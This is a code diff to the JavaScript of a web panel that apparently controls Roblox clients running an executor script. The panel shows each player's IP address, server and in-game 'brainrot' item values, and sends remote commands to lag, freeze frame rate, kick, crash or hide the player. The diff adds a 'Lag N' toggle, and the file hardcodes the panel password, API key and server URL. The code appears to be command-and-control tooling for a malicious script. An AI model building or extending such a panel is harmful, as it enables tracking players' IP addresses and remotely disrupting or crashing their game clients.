@@ -1284,11 +1284,12 @@ function renderPlayers() {
     }
     let html = '';
     for (const p of list) {
-        const isSelected = p.user_id === selectedUserId;
         const isOnline = p.online;
         const initial = (p.username || '?')[0].toUpperCase();
         const avatarHtml = p.avatar_url ? `<img src="${p.avatar_url}" alt="${p.username}" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'">` : '';
         const fallbackStyle = p.avatar_url ? 'display:none' : '';
+
+        // Always show brainrots
         let brainrotsHtml = '';
         if (p.brainrots && p.brainrots.length > 0) {
             const brainrotItems = p.brainrots.map(b => `<div class="brainrot-item"><span class="title">${b.title || 'Unknown'}</span><span class="cash">${formatCash(b.cash)}</span></div>`).join('');
@@ -1296,12 +1297,63 @@ function renderPlayers() {
         } else {
             brainrotsHtml = `<div class="brainrots-header"><h4>🧠 BRAINROTS</h4><span class="count">0 items</span></div><div class="brainrot-empty">No brainrots found</div>`;
         }
+
+        // Always show server players
         let serverPlayersHtml = '';
         if (p.server_players && p.server_players.length > 0) {
             serverPlayersHtml = `<div style="margin-bottom: 14px;"><div style="font-size: 10px; text-transform: uppercase; letter-spacing: 0.5px; color: var(--text-muted); margin-bottom: 6px;">Server players (${p.server_players.length})</div><div class="server-players">${p.server_players.map(sp => `<span class="server-player-tag">${sp}</span>`).join('')}</div></div>`;
         }
+
         const state = commandStates.get(p.user_id) || { fps_limit: false, lag_n: false, lag_c: false };
-        html += `<div class="player-card ${isOnline ? '' : 'offline'} ${isSelected ? 'selected' : ''}" onclick="selectPlayer('${p.user_id}')"><span class="details-toggle" onclick="event.stopPropagation(); toggleDetails('${p.user_id}')">${isSelected ? '▲' : 'Details ▼'}</span><div class="player-card-header"><div class="player-avatar">${avatarHtml}<div class="fallback" style="${fallbackStyle}">${initial}</div><div class="status-indicator ${isOnline ? 'online' : 'offline'}"></div></div><div class="player-info"><div class="player-name">${p.username || 'Unknown'}<span class="handle">@${p.username || 'unknown'}</span><span class="id">${p.user_id || '?'}</span></div><div class="player-meta"><span class="tag">${p.game_name || 'Unknown Game'}</span><span class="tag">${p.executor || 'unknown'}</span><span class="tag">${isOnline ? 'Delta · ' + (p.server_players ? p.server_players.length : 0) + ' in server' : 'last seen ' + formatTimeAgo(p.lastHeartbeat)}</span></div></div><div class="player-status-badge ${isOnline ? 'online' : 'offline'}">${isOnline ? 'ONLINE' : 'OFFLINE'}</div></div>${isSelected ? `<div class="player-details"><div class="detail-item"><span class="label">Place ID</span><span class="value id">${p.place_id || '—'}</span></div><div class="detail-item"><span class="label">Job ID</span><span class="value id muted">${p.job_id || '—'}</span></div><div class="detail-item"><span class="label">IP Address</span><span class="value">${p.ip_address || '—'}</span></div><div class="detail-item"><span class="label">Past IP Address</span><span class="value muted">—</span></div></div>${serverPlayersHtml}<div class="brainrot-section">${brainrotsHtml}</div><div class="action-buttons"><button class="action-btn fps" onclick="event.stopPropagation(); toggleFps('${p.user_id}')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>Stop FPS</button><button class="action-btn lag" onclick="event.stopPropagation(); toggleLagC('${p.user_id}')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg>Stop Lag C</button><button class="action-btn kick" onclick="event.stopPropagation(); kickPlayer('${p.user_id}')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>Kick</button><button class="action-btn crash" onclick="event.stopPropagation(); crashPlayer('${p.user_id}')"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.205 16.5c-.77.833.192 2.5 1.732 2.5z"/></svg>Crash</button><button class="action-btn hide" onclick="event.stopPropagation(); hidePlayer('${p.user_id}', event)"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"/></svg>Hide</button></div>` : ''}</div>`;
+
+        html += `<div class="player-card ${isOnline ? '' : 'offline'}">
+            <div class="player-card-header">
+                <div class="player-avatar">${avatarHtml}<div class="fallback" style="${fallbackStyle}">${initial}</div><div class="status-indicator ${isOnline ? 'online' : 'offline'}"></div></div>
+                <div class="player-info">
+                    <div class="player-name">${p.username || 'Unknown'}<span class="handle">@${p.username || 'unknown'}</span><span class="id">${p.user_id || '?'}</span></div>
+                    <div class="player-meta">
+                        <span class="tag">${p.game_name || 'Unknown Game'}</span>
+                        <span class="tag">${p.executor || 'unknown'}</span>
+                        <span class="tag">${isOnline ? 'Delta · ' + (p.server_players ? p.server_players.length : 0) + ' in server' : 'last seen ' + formatTimeAgo(p.lastHeartbeat)}</span>
+                    </div>
+                </div>
+                <div class="player-status-badge ${isOnline ? 'online' : 'offline'}">${isOnline ? 'ONLINE' : 'OFFLINE'}</div>
+            </div>
+            <div class="player-details">
+                <div class="detail-item"><span class="label">Place ID</span><span class="value id">${p.place_id || '—'}</span></div>
+                <div class="detail-item"><span class="label">Job ID</span><span class="value id muted">${p.job_id || '—'}</span></div>
+                <div class="detail-item"><span class="label">IP Address</span><span class="value">${p.ip_address || '—'}</span></div>
+                <div class="detail-item"><span class="label">Executor</span><span class="value">${p.executor || '—'}</span></div>
+            </div>
+            ${serverPlayersHtml}
+            <div class="brainrot-section">${brainrotsHtml}</div>
+            <div class="action-buttons">
+                <button class="action-btn fps" onclick="toggleFps('${p.user_id}')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
+                    ${state.fps_limit ? 'Resume FPS' : 'Stop FPS'}
+                </button>
+                <button class="action-btn lag" onclick="toggleLagN('${p.user_id}')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg>
+                    ${state.lag_n ? 'Stop Lag N' : 'Lag N'}
+                </button>
+                <button class="action-btn lag" onclick="toggleLagC('${p.user_id}')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg>
+                    ${state.lag_c ? 'Stop Lag C' : 'Lag C'}
+                </button>
+                <button class="action-btn kick" onclick="kickPlayer('${p.user_id}')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
+                    Kick
+                </button>
+                <button class="action-btn crash" onclick="crashPlayer('${p.user_id}')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.205 16.5c-.77.833.192 2.5 1.732 2.5z"/></svg>
+                    Crash
+                </button>
+                <button class="action-btn hide" onclick="hidePlayer('${p.user_id}', event)">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"/></svg>
+                    Hide
+                </button>
+            </div>
+        </div>`;
     }
     container.innerHTML = html;
 }
@@ -1330,6 +1382,17 @@ async function toggleLagC(userId) {
     await sendCommand(userId, { lag_c: state.lag_c, lag_n: state.lag_n });
     showToast(`Lag C ${state.lag_c ? 'ON' : 'OFF'}`, 'success');
     addChatMsg('system', `Lag C ${state.lag_c ? 'ON' : 'OFF'} -> ${players.get(userId)?.username || 'player'}`);
+    renderPlayers();
+}
+
+async function toggleLagN(userId) {
+    const state = commandStates.get(userId);
+    if (!state) return;
+    state.lag_n = !state.lag_n;
+    if (state.lag_n) state.lag_c = false;
+    await sendCommand(userId, { lag_n: state.lag_n, lag_c: state.lag_c });
+    showToast(`Lag N ${state.lag_n ? 'ON' : 'OFF'}`, 'success');
+    addChatMsg('system', `Lag N ${state.lag_n ? 'ON' : 'OFF'} -> ${players.get(userId)?.username || 'player'}`);
     renderPlayers();
 }
 
@@ -1500,7 +1563,7 @@ document.getElementById('loaderModal').addEventListener('click', (e) => {
 });
 
 
-// LOGIN OVERLAY - injected at end of main script
+// LOGIN OVERLAY
 const PANEL_PASSWORD = 'aggredireontopstupidnga';
 const DEFAULT_PANEL_URL = 'https://roblox-panel-4h3i.onrender.com';
 const DEFAULT_API_KEY = 'aggredireontopstupidnga';
